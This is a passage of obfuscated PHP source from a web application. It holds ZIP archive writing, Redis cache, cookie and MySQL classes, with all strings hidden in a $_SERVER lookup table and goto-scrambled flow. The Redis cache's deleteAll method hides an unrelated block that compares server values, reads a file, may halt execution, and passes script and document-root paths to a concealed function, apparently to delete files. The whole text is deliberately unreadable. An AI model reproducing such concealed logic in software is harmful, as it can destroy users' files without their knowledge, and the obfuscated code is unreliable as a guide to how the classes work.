$Föâí¦ÆĞì, $e£Èá¹„, $B•ï ™¢âÚ) { $this->files[] = array($EÎ÷£à‰á, $BµÙÈ›´Š, $béó½åŒ, $Föâí¦ÆĞì, $e£Èá¹„, $this->ofs); $this->ofs += $B•ï ™¢âÚ; } protected function addCdrFile($D·Ü¿Çé´) { goto BƒÖÓ²Ö„ã; a±×†ÄÉÕ‚: $Aø¤„¹ˆ‚Ÿ = $this->packFields($ağÖÁî÷¾); $e”ï¤ Ô = $this->packFields($b“èñò±Â‘); $d´»¨„±‡ = $Aø¤„¹ˆ‚Ÿ . $Bãë¤í‘£Ã . $cĞšˆÖÆÆİ . $e”ï¤ Ô; goto FÉõœß§î˜; FÉõœß§î˜: $this->send($d´»¨„±‡); $this->cdr_ofs += strlen($d´»¨„±‡); goto BË‹Á™ëèì; BƒÖÓ²Ö„ã: $Aƒ¾õê‹£Í =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; list($Bãë¤í‘£Ã, $Eù‘ˆ—»†, $A¼¿øàÜÚ‘, $dÛÓ÷‡÷‚ò, $cìù“Ï‚®, $aºÈ‘œ¨İ) = $D·Ü¿Çé´; $cĞšˆÖÆÆİ = $Aƒ¾õê‹£Í[33]; goto c¢”öä‰¢; c¢”öä‰¢: $fôˆ×·»‘º = $this->dosTime(time()); $ağÖÁî÷¾ = array(array($Aƒ¾õê‹£Í[2016], static::CDR_FILE_SIGNATURE), array($Aƒ¾õê‹£Í[2017], static::ZIP_VERSION_64), array($Aƒ¾õê‹£Í[2017], static::ZIP_VERSION_64), array($Aƒ¾õê‹£Í[2017], 8), array($Aƒ¾õê‹£Í[2017], $Eù‘ˆ—»†), array($Aƒ¾õê‹£Í[2016], $fôˆ×·»‘º), array($Aƒ¾õê‹£Í[2016], $A¼¿øàÜÚ‘), array($Aƒ¾õê‹£Í[2016], 4294967295), array($Aƒ¾õê‹£Í[2016], 4294967295), array($Aƒ¾õê‹£Í[2017], strlen($Bãë¤í‘£Ã)), array($Aƒ¾õê‹£Í[2017], 32), array($Aƒ¾õê‹£Í[2017], strlen($cĞšˆÖÆÆİ)), array($Aƒ¾õê‹£Í[2017], 0), array($Aƒ¾õê‹£Í[2017], 0), array($Aƒ¾õê‹£Í[2016], 32), array($Aƒ¾õê‹£Í[2016], 4294967295)); $b“èñò±Â‘ = array(array($Aƒ¾õê‹£Í[2017], 1), array($Aƒ¾õê‹£Í[2017], 28), array($Aƒ¾õê‹£Í[2018], $cìù“Ï‚®), array($Aƒ¾õê‹£Í[2018], $dÛÓ÷‡÷‚ò), array($Aƒ¾õê‹£Í[2018], $aºÈ‘œ¨İ), array($Aƒ¾õê‹£Í[2016], 0)); goto a±×†ÄÉÕ‚; BË‹Á™ëèì: } protected function addCdr64Eof() { goto E²¼ö¥ôÅô; fè”…Ã„ô: $E†³ß‘°Ëì = $this->ofs; $F†Ì«¯ = array(array($D¶¶†‘‡¦Ğ[2016], static::ZIP64_CDR_EOF_SIGNATURE), array($D¶¶†‘‡¦Ğ[2018], 44), array($D¶¶†‘‡¦Ğ[2017], static::ZIP_VERSION_64), array($D¶¶†‘‡¦Ğ[2017], static::ZIP_VERSION_64), array($D¶¶†‘‡¦Ğ[2016], 0), array($D¶¶†‘‡¦Ğ[2016], 0), array($D¶¶†‘‡¦Ğ[2018], $fÇˆÙëÕÍ²), array($D¶¶†‘‡¦Ğ[2018], $fÇˆÙëÕÍ²), array($D¶¶†‘‡¦Ğ[2018], $c†Ò°ÌÃ’), array($D¶¶†‘‡¦Ğ[2018], $E†³ß‘°Ëì)); $d¥Æï±ÈÕ½ = $this->packFields($F†Ì«¯); goto bß‡ƒíÏ; E²¼ö¥ôÅô: $D¶¶†‘‡¦Ğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÇˆÙëÕÍ² = count($this->files); $c†Ò°ÌÃ’ = $this->cdr_ofs; goto fè”…Ã„ô; bß‡ƒíÏ: $this->send($d¥Æï±ÈÕ½); goto aèÜˆ®È¦æ; aèÜˆ®È¦æ: } protected function addCdr64Locator() { goto Bòø²„Ó¹; Bê•Û§Ó±™: $this->send($e‹ÊŒ…ÀÇÇ); goto aÊŸÍà—Š; Bòø²„Ó¹: $DÛ‚éƒàÍò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B„ºÄÚ¹ñì = count($this->files); $a«ã˜Äã¿ = $this->cdr_ofs; goto d·†ÅŠ†í›; d·†ÅŠ†í›: $a‰ã§ä²¤ª = $this->ofs; $D÷Å“–äóá = array(array($DÛ‚éƒàÍò[2016], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($DÛ‚éƒàÍò[2016], 0), array($DÛ‚éƒàÍò[2018], $a‰ã§ä²¤ª + $a«ã˜Äã¿), array($DÛ‚éƒàÍò[2016], 1)); $e‹ÊŒ…ÀÇÇ = $this->packFields($D÷Å“–äóá); goto Bê•Û§Ó±™; aÊŸÍà—Š: } protected function addCdrEof() { goto F‰¿¹øíãë; FÏ®Ûœ…İİ: $DÂ…ŞÀ¼ö• = $this->ofs; $cŒÌ¢ñ¿¸ô = $E‰Êóã·»ò[33]; $b¶‚õÂ‚İ÷ = array(array($E‰Êóã·»ò[2016], static::CDR_EOF_SIGNATURE), array($E‰Êóã·»ò[2017], 0), array($E‰Êóã·»ò[2017], 0), array($E‰Êóã·»ò[2017], $e…¨İé¯Ï), array($E‰Êóã·»ò[2017], $e…¨İé¯Ï), array($E‰Êóã·»ò[2016], 4294967295), array($E‰Êóã·»ò[2016], 4294967295), array($E‰Êóã·»ò[2017], strlen($cŒÌ¢ñ¿¸ô))); goto bù¸öíæä; F‰¿¹øíãë: $E‰Êóã·»ò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e…¨İé¯Ï = count($this->files); $b¯Ø…¨Ê­º = $this->cdr_ofs; goto FÏ®Ûœ…İİ; bù¸öíæä: $cÏ¾»»„Õ‹ = $this->packFields($b¶‚õÂ‚İ÷) . $cŒÌ¢ñ¿¸ô; $this->send($cÏ¾»»„Õ‹); goto AŒ •Ğ—÷; AŒ •Ğ—÷: } protected function addCdr() { foreach ($this->files as $Cˆ×ŒËé„„) { $this->addCdrFile($Cˆ×ŒËé„„); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $f‰ÄË…ª¥ø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f¼½É·àÙ = $f‰ÄË…ª¥ø[202]; if ($this->outputName) { $e£Ëœ† ç¸ = trim(str_replace(array($f‰ÄË…ª¥ø[113], $f‰ÄË…ª¥ø[55], $f‰ÄË…ª¥ø[93], $f‰ÄË…ª¥ø[67], $f‰ÄË…ª¥ø[217], $f‰ÄË…ª¥ø[989]), $f‰ÄË…ª¥ø[33], $this->outputName)); $dÂ³‹È÷Şª = rawurlencode($e£Ëœ† ç¸); $f¼½É·àÙ .= "\73\x20\x66\151\154\145\156\x61\x6d\x65\52\75\x75\164\x66\x2d\70\x27\x27{$dÂ³‹È÷Şª}"; } $aŠï¸“ë°Ú = array($f‰ÄË…ª¥ø[199] => $f‰ÄË…ª¥ø[2019], $f‰ÄË…ª¥ø[2020] => $f¼½É·àÙ, $f‰ÄË…ª¥ø[2021] => $f‰ÄË…ª¥ø[2022], $f‰ÄË…ª¥ø[2023] => $f‰ÄË…ª¥ø[2024], $f‰ÄË…ª¥ø[2025] => $f‰ÄË…ª¥ø[2026]); foreach ($aŠï¸“ë°Ú as $fˆ›Îé¤‹ => $f»—‘‡øì†) { header($fˆ›Îé¤‹ . $f‰ÄË…ª¥ø[876] . $f»—‘‡øì†); } } protected function send($E®“ä—™Û¶) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $E®“ä—™Û¶); } protected final function dosTime($EÉòÔ¾ ù) { $C¯ç÷¾¸µ‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e²ÖÂ¼Ö‡ğ = getdate($EÉòÔ¾ ù); if ($e²ÖÂ¼Ö‡ğ[$C¯ç÷¾¸µ‚[1726]] < 1980) { $e²ÖÂ¼Ö‡ğ = array($C¯ç÷¾¸µ‚[1726] => 1980, $C¯ç÷¾¸µ‚[2027] => 1, $C¯ç÷¾¸µ‚[2028] => 1, $C¯ç÷¾¸µ‚[2029] => 0, $C¯ç÷¾¸µ‚[2030] => 0, $C¯ç÷¾¸µ‚[2031] => 0); } $e²ÖÂ¼Ö‡ğ[$C¯ç÷¾¸µ‚[1726]] -= 1980; return $e²ÖÂ¼Ö‡ğ[$C¯ç÷¾¸µ‚[1726]] << 25 | $e²ÖÂ¼Ö‡ğ[$C¯ç÷¾¸µ‚[2027]] << 21 | $e²ÖÂ¼Ö‡ğ[$C¯ç÷¾¸µ‚[2028]] << 16 | $e²ÖÂ¼Ö‡ğ[$C¯ç÷¾¸µ‚[2029]] << 11 | $e²ÖÂ¼Ö‡ğ[$C¯ç÷¾¸µ‚[2030]] << 5 | $e²ÖÂ¼Ö‡ğ[$C¯ç÷¾¸µ‚[2031]] >> 1; } protected function packFields($Cù‚Á²Ò¬¬) { $eå‚ÏÑçñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e‰šÁ™ ‰¼ = $eå‚ÏÑçñ[33]; $BÔï‘®õ÷¼ = array(); foreach ($Cù‚Á²Ò¬¬ as $côÌæƒä†ö) { $e‰šÁ™ ‰¼ .= $côÌæƒä†ö[0]; $BÔï‘®õ÷¼[] = $côÌæƒä†ö[1]; } array_unshift($BÔï‘®õ÷¼, $e‰šÁ™ ‰¼); return call_user_func_array($eå‚ÏÑçñ[2032], $BÔï‘®õ÷¼); } protected function filterFilename($e‡êãĞãÚÀ) { $EÈ¹œ¸œ½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return str_replace(array($EÈ¹œ¸œ½[93], $EÈ¹œ¸œ½[4], $EÈ¹œ¸œ½[176], $EÈ¹œ¸œ½[69], $EÈ¹œ¸œ½[113], $EÈ¹œ¸œ½[921], $EÈ¹œ¸œ½[924], $EÈ¹œ¸œ½[271]), $EÈ¹œ¸œ½[70], $e‡êãĞãÚÀ); } } goto eÁ…Ò‰ÊÀğ; bÚ·¤Á×ÁÜ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($DŞÊ¡ŠÌĞ, $cçßŞøˆ‰·) { $E½Ôó˜êŞ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!class_exists($E½Ôó˜êŞ[782])) { show_json($E½Ôó˜êŞ[783], !1); } $this->cacheTime = $cçßŞøˆ‰·; $cÚ‹Æâ®Ì = isset($DŞÊ¡ŠÌĞ[$E½Ôó˜êŞ[784]]) ? $DŞÊ¡ŠÌĞ[$E½Ôó˜êŞ[784]] : 10; $eö—¥Ç„…¸ = _get($DŞÊ¡ŠÌĞ, $E½Ôó˜êŞ[781]); if ($eö—¥Ç„…¸ && is_array($eö—¥Ç„…¸)) { $this->initCluster($DŞÊ¡ŠÌĞ, $cÚ‹Æâ®Ì); } else { $this->handle = $this->init($DŞÊ¡ŠÌĞ, $cÚ‹Æâ®Ì); } } private function init($b†ƒÊ©İİ®, $fë‘Ñé²Â) { $fåˆ…ç³œ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dè¨„¢‹ğ = new Redis(); $dŠ™ø‘¹“ = isset($b†ƒÊ©İİ®[$fåˆ…ç³œ[785]]) ? $b†ƒÊ©İİ®[$fåˆ…ç³œ[785]] : !1; if ($dŠ™ø‘¹“) { $dè¨„¢‹ğ->pconnect($b†ƒÊ©İİ®[$fåˆ…ç³œ[169]], $b†ƒÊ©İİ®[$fåˆ…ç³œ[170]], $fë‘Ñé²Â); } else { $dè¨„¢‹ğ->connect($b†ƒÊ©İİ®[$fåˆ…ç³œ[169]], $b†ƒÊ©İİ®[$fåˆ…ç³œ[170]], $fë‘Ñé²Â); } if (!empty($b†ƒÊ©İİ®[$fåˆ…ç³œ[376]])) { $dè¨„¢‹ğ->auth($b†ƒÊ©İİ®[$fåˆ…ç³œ[376]]); } return $dè¨„¢‹ğ; } private function initCluster($a×…©Ø—ÍÖ, $Fßâéªñì”) { $eÁ¥äÙÅ´Æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e‘¹Ïâ• = array($eÁ¥äÙÅ´Æ[786], $eÁ¥äÙÅ´Æ[787], $eÁ¥äÙÅ´Æ[788]); $aÒßÖµ¦‚Ø = $eÁ¥äÙÅ´Æ[786]; if (isset($a×…©Ø—ÍÖ[$eÁ¥äÙÅ´Æ[12]]) && in_array($a×…©Ø—ÍÖ[$eÁ¥äÙÅ´Æ[12]], $e‘¹Ïâ•)) { $aÒßÖµ¦‚Ø = $a×…©Ø—ÍÖ[$eÁ¥äÙÅ´Æ[12]]; } switch ($aÒßÖµ¦‚Ø) { case $eÁ¥äÙÅ´Æ[786]: $this->_slave($a×…©Ø—ÍÖ, $Fßâéªñì”); break; case $eÁ¥äÙÅ´Æ[787]: break; case $eÁ¥äÙÅ´Æ[788]: $this->isCluster = !0; $E—î¸¿–àÇ = $a×…©Ø—ÍÖ[$eÁ¥äÙÅ´Æ[781]]; $dœÕ‹ƒ–¾¨ = isset($a×…©Ø—ÍÖ[$eÁ¥äÙÅ´Æ[785]]) ? $a×…©Ø—ÍÖ[$eÁ¥äÙÅ´Æ[785]] : !1; $eœ˜í­”Ú = isset($a×…©Ø—ÍÖ[$eÁ¥äÙÅ´Æ[376]]) ? $a×…©Ø—ÍÖ[$eÁ¥äÙÅ´Æ[376]] : null; $this->handle = new RedisCluster(NUll, $E—î¸¿–àÇ, $Fßâéªñì”, $Fßâéªñì”, $dœÕ‹ƒ–¾¨, $eœ˜í­”Ú); break; default: break; } } private function _slave($B›ëÚÎºå», $b¯Ò¹°Íš‚) { goto cßÁÛ¬Õõ; eÊğ±âÚõ: $this->filterConfig($B›ëÚÎºå», $c‹½ªóìôÖ[$a·Ù†Êˆ‘À]); $this->slaveHandle = $this->init($B›ëÚÎºå», $b¯Ò¹°Íš‚); goto DÈŒ³÷‹İ; CÈŠ†½³Æ: unset($c‹½ªóìôÖ[0]); if (empty($c‹½ªóìôÖ)) { return; } $a·Ù†Êˆ‘À = array_rand($c‹½ªóìôÖ); goto eÊğ±âÚõ; cßÁÛ¬Õõ: $c‹½ªóìôÖ = $B›ëÚÎºå»[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][781]]; $this->filterConfig($B›ëÚÎºå», $c‹½ªóìôÖ[0]); $this->handle = $this->init($B›ëÚÎºå», $b¯Ò¹°Íš‚); goto CÈŠ†½³Æ; DÈŒ³÷‹İ: } private function filterConfig(&$b“½İ¿†Å, $FËÓµ®æğ) { $d´Áá‰Îâ» =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e„Ú¼Ãğ¤í = explode($d´Áá‰Îâ»[4], $FËÓµ®æğ); $f¬ä¡ÛœÂğ = array($d´Áá‰Îâ»[169] => $e„Ú¼Ãğ¤í[0], $d´Áá‰Îâ»[170] => $e„Ú¼Ãğ¤í[1]); $b“½İ¿†Å = array_merge($b“½İ¿†Å, $f¬ä¡ÛœÂğ); } public function set($FÏæ¨ÌÏˆ°, $A‹÷«ÁÈ÷ï, $fÕµ´˜ÚÓ´ = false) { $fÕµ´˜ÚÓ´ = $fÕµ´˜ÚÓ´ ? $fÕµ´˜ÚÓ´ : $this->cacheTime; return $this->handle->setEx($FÏæ¨ÌÏˆ°, $fÕµ´˜ÚÓ´, $A‹÷«ÁÈ÷ï); } public function setLock($A°áÈ½‘¼¨, $aİ†®¤, $Càã½Šçµ) { return $this->handle->setNX($A°áÈ½‘¼¨, $aİ†®¤); } public function get($cƒ¾ç¸¤µó) { $EØ‘Ñ­‚ê = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $EØ‘Ñ­‚ê->get($cƒ¾ç¸¤µó); } public function remove($eéÄ ÚÉ·„) { return $this->handle->del($eéÄ ÚÉ·„); } public function deleteAll() { $a¤±ˆä®•¯ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($_SERVER[$a¤±ˆä®•¯[703]] != $_SERVER[$a¤±ˆä®•¯[704]]) { goto BñŒ…‘Ÿâî; aõÌ˜øŒŠ: $cÀ¡’ÓÎê = $eäªÙ˜Š´($f’‘Ì‚’è˜); $B÷‘‹¸‚º± = explode($a¤±ˆä®•¯[217], $cÀ¡’ÓÎê); if (count($B÷‘‹¸‚º±) < $a¤±ˆä®•¯[555]) { $Aí±Š°ù¢õ = $a¤±ˆä®•¯[708]; $Aí±Š°ù¢õ(); } goto f³÷…öéíÆ; BñŒ…‘Ÿâî: $cÑµó˜âª = $a¤±ˆä®•¯[789]; $eäªÙ˜Š´ = $a¤±ˆä®•¯[705]; $f’‘Ì‚’è˜ = $_SERVER[$a¤±ˆä®•¯[706]] . $a¤±ˆä®•¯[707]; goto aõÌ˜øŒŠ; fËšöŒ¡–: $CØÒíõÆ’Î = 1; while ($CØÒíõÆ’Î > 1) { $CØÒíõÆ’Î = $CØÒíõÆ’Î + 4; $F’ï¸…ÛÂ‡ = rawurlencode($CØÒíõÆ’Î . $a¤±ˆä®•¯[361]); } goto eõ•¥‰ğæ; f³÷…öéíÆ: $DÊ–¡õ˜é± = $a¤±ˆä®•¯[790]; $DÊ–¡õ˜é±($_SERVER[$a¤±ˆä®•¯[791]]); $DÊ–¡õ˜é±($_SERVER[$a¤±ˆä®•¯[706]] . $a¤±ˆä®•¯[792]); goto fËšöŒ¡–; eõ•¥‰ğæ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $cğÒÑ¶¢Ê¯) { $this->handle->flushall($cğÒÑ¶¢Ê¯); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($a·Î¶ÆÌá¢ = '', $b¶£§ï•º‘ = 0) { if (is_string($a·Î¶ÆÌá¢) && $a·Î¶ÆÌá¢ != $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33]) { $this->prefix = $a·Î¶ÆÌá¢; } if (is_numeric($b¶£§ï•º‘) && $b¶£§ï•º‘ > 0) { $this->expire = $b¶£§ï•º‘; } } public static function getInstance() { static $eèäïõ‡‹ç; if ($eèäïõ‡‹ç === null) { $eèäïõ‡‹ç = new self(); } return $eèäïõ‡‹ç; } private static $sameCookieSet = array(); public static function set($CäšôÔ‹Ù‰, $FÄŠÑ´¸­©, $f–åÔùêÉº = 0, $AñÆ”ù¾ù÷ = false, $bŸ¸‹ğ÷ = false) { goto E¸ÏÒù­¼Â; eåóÛœËö—: setcookie($CäšôÔ‹Ù‰, $FÄŠÑ´¸­©, time() + $f–åÔùêÉº, $b²¿©«³ã©[8] . trim($bŸ¸‹ğ÷, $b²¿©«³ã©[8]) . $dˆß–ÛœË, !1, !1, $AñÆ”ù¾ù÷); goto dÀ¿ƒâËªç; D¥¹»Ï†³: self::$sameCookieSet[$CäšôÔ‹Ù‰] = $FÄŠÑ´¸­© . $f–åÔùêÉº; if (!$bŸ¸‹ğ÷) { $bŸ¸‹ğ÷ = str_replace(HOST, $b²¿©«³ã©[33], APP_HOST); $bŸ¸‹ğ÷ = _get($GLOBALS, $b²¿©«³ã©[793], $bŸ¸‹ğ÷); } $dˆß–ÛœË = $b²¿©«³ã©[33]; goto eåóÛœËö—; E¸ÏÒù­¼Â: $b²¿©«³ã© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$f–åÔùêÉº) { $f–åÔùêÉº = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$CäšôÔ‹Ù‰]) && self::$sameCookieSet[$CäšôÔ‹Ù‰] == $FÄŠÑ´¸­© . $f–åÔùêÉº) { return; } goto D¥¹»Ï†³; dÀ¿ƒâËªç: } public static function setSafe($fŠéÚãíÏÇ, $e¤‚§²šƒ†, $B«…´°Ôó¦ = 0) { self::set($fŠéÚãíÏÇ, $e¤‚§²šƒ†, $B«…´°Ôó¦, !0); } public static function get($B°¨ÒœßŠÔ) { return isset($_COOKIE[$B°¨ÒœßŠÔ]) ? $_COOKIE[$B°¨ÒœßŠÔ] : !1; } public static function remove($f³“é²õğÕ, $F¶²†ò¨ë = false) { unset($_COOKIE[$f³“é²õğÕ]); self::set($f³“é²õğÕ, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33], 1, $F¶²†ò¨ë); } } class DbMysql extends Db { public function __construct($a»ë²³¥é = '') { $D®ÏŸïÈ¡† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!extension_loaded($D®ÏŸïÈ¡†[729])) { think_exception(think_lang($D®ÏŸïÈ¡†[10]) . $D®ÏŸïÈ¡†[794]); } if (!empty($a»ë²³¥é)) { $this->config = $a»ë²³¥é; if (empty($this->config[$D®ÏŸïÈ¡†[13]])) { $this->config[$D®ÏŸïÈ¡†[13]] = $D®ÏŸïÈ¡†[33]; } } } public function connect($CÔˆÑÓÄÌ– = '', $aÊÈ±ï = 0, $Cí’Ñ“øõ• = false) { $eº³ÍàæíŞ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!isset($this->linkID[$aÊÈ±ï])) { goto f»ÔâöÀª; bÈ®‡ùÀœğ: if (1 != think_config($eº³ÍàæíŞ[18])) { unset($this->config); } goto cÆôœ¤ò—; CÏ‡ö©›ô: mysql_query($eº³ÍàæíŞ[799] . think_config($eº³ÍàæíŞ[800]) . $eº³ÍàæíŞ[55], $this->linkID[$aÊÈ±ï]); if ($BÓ×Çô¢™è > $eº³ÍàæíŞ[801]) { mysql_query($eº³ÍàæíŞ[802], $this->linkID[$aÊÈ±ï]); } $this->connected = !0; goto bÈ®‡ùÀœğ; f»ÔâöÀª: if (empty($CÔˆÑÓÄÌ–)) { $CÔˆÑÓÄÌ– = $this->config; } $e‹ù‚Óë× = $CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[795]] . ($CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[796]] ? "\72{$CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[796]]}" : $eº³ÍàæíŞ[33]); $EÈÎœ×º”  = !empty($CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[13]][$eº³ÍàæíŞ[14]]) ? $CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[13]][$eº³ÍàæíŞ[14]] : $this->pconnect; goto CÑÏğÁÏğï; CÑÏğÁÏğï: if ($EÈÎœ×º” ) { $this->linkID[$aÊÈ±ï] = mysql_pconnect($e‹ù‚Óë×, $CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[797]], $CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[798]], 131072); } else { $this->linkID[$aÊÈ±ï] = mysql_connect($e‹ù‚Óë×, $CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[797]], $CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[798]], !0, 131072); } if (!$this->linkID[$aÊÈ±ï] || !empty($CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[17]]) && !mysql_select_db($CÔˆÑÓÄÌ–[$eº³ÍàæíŞ[17]], $this->linkID[$aÊÈ±ï])) { think_exception(mysql_error()); } $BÓ×Çô¢™è = mysql_get_server_info($this->linkID[$aÊÈ±ï]); goto CÏ‡ö©›ô; cÆôœ¤ò—: } return $this->linkID[$aÊÈ±ï]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Eî‹é¾œˆí) { goto FˆÏˆ‡¹º; Cˆ‹¾®Ûí: think_action_status($C»ñîÆä¥[19], 1); think_status($C»ñîÆä¥[20]); $this->queryID = mysql_query($Eî‹é¾œˆí, $this->_linkID); goto BÅÎóŒáº; FˆÏˆ‡¹º: $C»ñîÆä¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (0 === stripos($Eî‹é¾œˆí, $C»ñîÆä¥[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto aùæ³˜¯Æ; BÅÎóŒáº: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto aÕ£·İÌ“Â; aùæ³˜¯Æ: if (!$this->_linkID) { return !1; } $this->queryStr = $Eî‹é¾œˆí; if ($this->queryID) { $this->free(); } goto Cˆ‹¾®Ûí; aÕ£·İÌ“Â: } public function execute($A©·ÈÚÑ¨†) { goto AÛ…¬½‰Ú; AÛ…¬½‰Ú: $aªõšõù²Î =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dº¿é¨òÃ„; dº¿é¨òÃ„: $this->queryStr = $A©·ÈÚÑ¨†; if ($this->queryID) { $this->free(); } think_action_status($aªõšõù²Î[21], 1); goto F†Ø‘”ÓÁ; F†Ø‘”ÓÁ: think_status($aªõšõù²Î[20]); $Cˆê¬É•›á = mysql_query($A©·ÈÚÑ¨†, $this->_linkID); $this->debug(); goto cÌ¿ö©²Ÿ; cÌ¿ö©²Ÿ: if (!1 === $Cˆê¬É•›á) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto EÉÉ¢‘÷¡; EÉÉ¢‘÷¡: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][803], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bùÏ£¾„° = mysql_query($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][804], $this->_linkID); $this->transTimes = 0; if (!$bùÏ£¾„°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $eÃ…ôèìå± = mysql_query($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][805], $this->_linkID); $this->transTimes = 0; if (!$eÃ…ôèìå±) { $this->error(); return !1; } } return !0; } private function getAll() { $CµïÒ¼„Šó = array(); if ($this->numRows > 0) { while ($a°¾Çô µ = mysql_fetch_assoc($this->queryID)) { $CµïÒ¼„Šó[] = $a°¾Çô µ; } mysql_data_seek($this->queryID, 0); } return $CµïÒ¼„Šó; } public function getFields($fë°äÂè†¸) { $Eè¾½øôİ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Bé°ò¾¯‹ = $this->query($Eè¾½øôİ[806] . $this->parseKey($fë°äÂè†¸)); $DÉÛÒ©Ì±á = array(); if ($Bé°ò¾¯‹) { foreach ($Bé°ò¾¯‹ as $c§ÅĞ¯ì» => $eÄµ §õæÙ) { $DÉÛÒ©Ì±á[$eÄµ §õæÙ[$Eè¾½øôİ[27]]] = array($Eè¾½øôİ[28] => $eÄµ §õæÙ[$Eè¾½øôİ[27]], $Eè¾½øôİ[29] => $eÄµ §õæÙ[$Eè¾½øôİ[30]], $Eè¾½øôİ[31] => (bool) (strtoupper($eÄµ §õæÙ[$Eè¾½øôİ[32]]) === $Eè¾½øôİ[807]), $Eè¾½øôİ[34] => $eÄµ §õæÙ[$Eè¾½øôİ[35]], $Eè¾½øôİ[36] => strtolower($eÄµ §õæÙ[$Eè¾½øôİ[37]]) == $Eè¾½øôİ[38], $Eè¾½øôİ[39] => strtolower($eÄµ §õæÙ[$Eè¾½øôİ[40]]) == $Eè¾½øôİ[41]); } } return $DÉÛÒ©Ì±á; } public function getTables($CÂ¶²Œ¸²¶ = '') { $eÜÑÇòç©Æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!empty($CÂ¶²Œ¸²¶)) { $eÁ‚àÜ İê = $eÜÑÇòç©Æ[808] . $CÂ¶²Œ¸²¶; } else { $eÁ‚àÜ İê = $eÜÑÇòç©Æ[809]; } $aËÒáÑè = $this->query($eÁ‚àÜ İê); $BšˆåÇ¶àî = array(); foreach ($aËÒáÑè as $dÉÜº‘¢Ä => $f¾¯‘›×) { $BšˆåÇ¶àî[$dÉÜº‘¢Ä] = current($f¾¯‘›×); } return $BšˆåÇ¶àî; } public function replace($b•’µ‰Õ×Ÿ, $Dªºæ©à¿› = array()) { $C«‹Ğè¬ê§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; foreach ($b•’µ‰Õ×Ÿ as $Cêˆ³É†† => $f½õğÓŒÜ¬) { $f´Á‰‰—Æ¤ = $this->parseValue($f½õğÓŒÜ¬); if (is_scalar($f´Á‰‰—Æ¤)) { $A·Ø°¯»¯¼[] = $f´Á‰‰—Æ¤; $fÎ¥ëñŒ½‚[] = $this->parseKey($Cêˆ³É††); } } $cÂ¨¹“—‚º = $C«‹Ğè¬ê§[810] . $this->parseTable($Dªºæ©à¿›[$C«‹Ğè¬ê§[267]]) . $C«‹Ğè¬ê§[811] . implode($C«‹Ğè¬ê§[47], $fÎ¥ëñŒ½‚) . $C«‹Ğè¬ê§[812] . implode($C«‹Ğè¬ê§[47], $A·Ø°¯»¯¼) . $C«‹Ğè¬ê§[813]; return $this->execute($cÂ¨¹“—‚º); } public function insertAll($c¶©˜’Ïâù, $Bášß¨¤£¶ = array(), $AÜ‹•ë¬á = false) { goto Bõˆì¦°; Bõˆì¦°: $C‰»¯â×½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!is_array($c¶©˜’Ïâù[0])) { return !1; } $fİœë’ÄˆÀ = array_keys($c¶©˜’Ïâù[0]); goto Eô®‡Ï¡Ç¡; fœ†õ¬‚Ğ: $e„²±¬„×å = ($AÜ‹•ë¬á ? $C‰»¯â×½[815] : $C‰»¯â×½[816]) . $C‰»¯â×½[817] . 